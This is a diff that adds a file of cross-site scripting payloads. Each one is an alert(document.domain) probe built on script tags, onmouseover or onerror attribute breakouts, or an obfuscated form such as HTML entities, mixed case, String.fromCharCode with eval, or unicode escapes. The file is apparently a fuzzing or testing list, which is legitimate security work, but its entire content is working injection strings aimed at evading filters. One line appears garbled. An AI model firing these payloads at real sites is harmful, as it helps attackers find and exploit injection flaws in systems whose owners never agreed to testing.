@@ -1,0 +1,23 @@
+'<script>alert(0)</script>
+
+' onmouseover=alert(document.domain) 
+
+';  if(1==1){ alert(0);}
+
+\"<SCriPT>alert(document.domain)</SCriPT>
+
+\"<img/onerror="alert(document.domain)"/src=0>
+
+<img 	onerror=alert(document.domain) 	src=0>
+
+' onmouseover=alert(document.domain) '
+
+' onmouseover = a97lert(document.doma97in) '
+
+' onmouseover=&#97&#108&#101&#114&#116&#40&#100&#111&#99&#117&#109&#101&#110&#116&#46&#100&#111&#109&#97&#105&#110&#41 ' 
+
+' onmouseover=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)) '
+
+\u003cscript\u003e alert(document.domain); \u003c\u002fscript\u003e
+
+
